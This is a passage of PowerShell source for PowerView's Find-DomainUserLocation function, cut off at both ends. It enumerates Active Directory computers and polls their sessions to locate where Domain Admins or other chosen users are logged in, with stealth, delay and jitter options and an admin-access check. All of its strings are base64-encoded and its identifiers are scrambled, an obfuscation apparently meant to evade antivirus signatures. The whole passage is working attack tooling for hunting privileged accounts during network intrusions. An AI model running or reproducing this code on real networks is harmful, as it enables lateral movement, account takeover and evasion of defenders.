        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAGEAbABsACAAdABoAHIAZQBhAGQAcwAgAGMAbwBtAHAAbABlAHQAZQBkAA==')))
    }
}
function Find-DomainUserLocation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/====\/\/=\_/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${__/==\/=\__/==\/==} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${__/===\/==\_/=\/\_} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${__/==========\_/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${____/\_____/\/===} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))] = $UserAllowDelegation }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/\/\/=\_/=\__/} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = @(${/=\/\/\/=\__/\_/=})
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFMAdABlAGEAbAB0AGgAIABlAG4AdQBtAGUAcgBhAHQAaQBvAG4AIAB1AHMAaQBuAGcAIABzAG8AdQByAGMAZQA6ACAAJABTAHQAZQBhAGwAdABoAFMAbwB1AHIAYwBlAA==')))
                ${_/\_/=\__/\/\_/=\} = New-Object System.Collections.ArrayList
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZgBpAGwAZQAgAHMAZQByAHYAZQByAHMA')))
                    ${__/====\__/\/===\} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/====\__/\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${___/=\/\_/\/===\_} = _/==\/===\__/\/=\_ @__/====\__/\/===\
                    if (${___/=\/\_/\/===\_} -isnot [System.Array]) { ${___/=\/\_/\/===\_} = @(${___/=\/\_/\/===\_}) }
                    ${_/\_/=\__/\/\_/=\}.AddRange( ${___/=\/\_/\/===\_} )
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMAfABBAGwAbAA=')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAARABGAFMAIABzAGUAcgB2AGUAcgBzAA==')))
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAHwAQQBsAGwA')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMA')))
                    ${_/\_/\______/=\__} = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${__/==\_/==\___/==} = _/=\/==\_/\_/\/\/= @_/\_/\______/=\__ | select -ExpandProperty dnshostname
                    if (${__/==\_/==\___/==} -isnot [System.Array]) { ${__/==\_/==\___/==} = @(${__/==\_/==\___/==}) }
                    ${_/\_/=\__/\/\_/=\}.AddRange( ${__/==\_/==\___/==} )
                }
                ${_/\/\/\/=\_/=\__/} = ${_/\_/=\__/\/\_/=\}.ToArray()
            }
            else {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAYQBsAGwAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
                ${_/\/\/\/=\_/=\__/} = __/\/\/=\/\_/==\/\ @_/\/====\/\/=\_/= | select -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${_/==\/\/\_/=\_/\/} = $Credential.GetNetworkCredential().UserName
        }
        else {
            ${_/==\/\/\_/=\_/\/} = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA=')))]) {
            ${/===\/=\__/\___/=} = @()
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${/===\/=\__/\___/=} = ____/\/====\/\___/ @____/\_____/\/=== | select -ExpandProperty samaccountname
        }
        else {
            ${/===\_/\_/===\_/=} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/===\/=\__/\___/=} = __/\_____/===\/\/\ @/===\_/\_/===\_/= | select -ExpandProperty MemberName
        }
        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $(${/===\/=\__/\___/=}.Length)"
        if ((-not $ShowAll) -and (${/===\/=\__/\___/=}.Length -eq 0)) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAHUAcwBlAHIAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAHQAYQByAGcAZQB0AA==')))
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, ${/===\/=\__/\___/=}, ${_/==\/\/\_/=\_/\/}, $Stealth, ${__/\__/\/\/\_/\/==})
            if (${__/\__/\/\/\_/\/==}) {
                $Null = __/\__/\/==\/==\_/ -__/\__/\/\/\_/\/== ${__/\__/\/\/\_/\/==} -__/\/=\/==\/=\/=\_
            }
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                if (${_/\/==\___/\/=\__}) {
                    ${__/===\_/\_/\/=\_} = ___/\/\/===\/\/\/\ -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_}
                    ForEach (${_/=\/\_/\_/\/\/\_} in ${__/===\_/\_/\/=\_}) {
                        ${/=\__/\_/\__/\/\_} = ${_/=\/\_/\_/\/\/\_}.UserName
                        ${/===\__/\___/\/\_} = ${_/=\/\_/\_/\/\/\_}.CName
                        if (${/===\__/\___/\/\_} -and ${/===\__/\___/\/\_}.StartsWith('\\')) {
                            ${/===\__/\___/\/\_} = ${/===\__/\___/\/\_}.TrimStart('\')
                        }
                        if ((${/=\__/\_/\__/\/\_}) -and (${/=\__/\_/\__/\/\_}.Trim() -ne '') -and (${/=\__/\_/\__/\/\_} -notmatch ${_/==\/\/\_/=\_/\/}) -and (${/=\__/\_/\__/\/\_} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                            if ( (-not ${/===\/=\__/\___/=}) -or (${/===\/=\__/\___/=} -contains ${/=\__/\_/\__/\/\_})) {
                                ${/===\/===\/\/=\/=} = New-Object PSObject
                                ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Null
                                ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\__/\_/\__/\/\_}
                                ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\_/==\/\/=\/\_}
                                ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) ${/===\__/\___/\/\_}
                                try {
                                    ${/=\/\___/\_/==\/=} = [System.Net.Dns]::GetHostEntry(${/===\__/\___/\/\_}) | select -ExpandProperty HostName
                                    ${/===\/===\/\/=\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) ${/=\/\___/\_/==\/=}
                                }
                                catch {
                                    ${/===\/===\/\/=\/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                }
                                if ($CheckAccess) {
                                    ${/\_____/\/\_/\/\/} = (________/=\/\_/=== -/=\/\/\/=\__/\_/= ${/===\__/\___/\/\_}).IsAdmin
